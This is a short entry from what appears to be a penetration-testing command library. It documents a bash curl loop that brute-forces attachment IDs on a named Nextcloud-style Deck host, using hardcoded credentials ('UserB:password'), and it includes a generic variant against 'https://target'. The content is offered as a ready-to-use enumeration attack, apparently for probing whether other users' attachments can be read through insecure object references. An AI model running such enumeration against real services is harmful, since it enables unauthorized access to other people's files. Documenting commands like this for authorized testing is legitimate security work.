---
id: c2b2c3d4-e5f6-7890-abcd-ef1234567896
data: >-
  for id in $(cat ids.txt); do curl -s -u "UserB:password" -w "%{http_code}
  %{url_effective}\n"
  "https://us.cloudamo.com/apps/deck/cards/8420/attachment/$id" | grep -v 404;
  done
tags:
  - brute-force
  - enumerate
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:29:28.629Z'
verified: false
validated: true
submitted: true
---
# curl-enumerate-ids

## Command

```bash
for id in $(cat ids.txt); do curl -s -u "UserB:password" -w "%{http_code} %{url_effective}\n" "https://us.cloudamo.com/apps/deck/cards/8420/attachment/$id" | grep -v 404; done
```

## Description

Brute-forces attachment IDs by looping curl requests and filtering successful responses (non-404).

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `ids.txt` | File with ID list | Yes |
| `-u` | Auth credentials | Yes |
| `-w` | Output HTTP code and URL | Yes |

## Examples

### Basic Usage

```bash
for id in {1..100}; do curl -s -w "%{http_code} $id\n" "https://target/attachment/$id"; done | grep 200
```

### Advanced Usage

Add silent mode and grep for valid hits as shown.

## Expected Output

Lines like "200 https://.../attachment/30" for valid IDs.

## Related

- [[procedures/Brute-Force-Attachment-IDs-for-Enumeration]]
